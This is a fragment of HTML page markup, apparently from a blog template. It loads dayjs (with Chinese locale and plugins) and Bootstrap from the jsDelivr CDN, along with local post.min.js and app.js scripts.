src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/zh.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
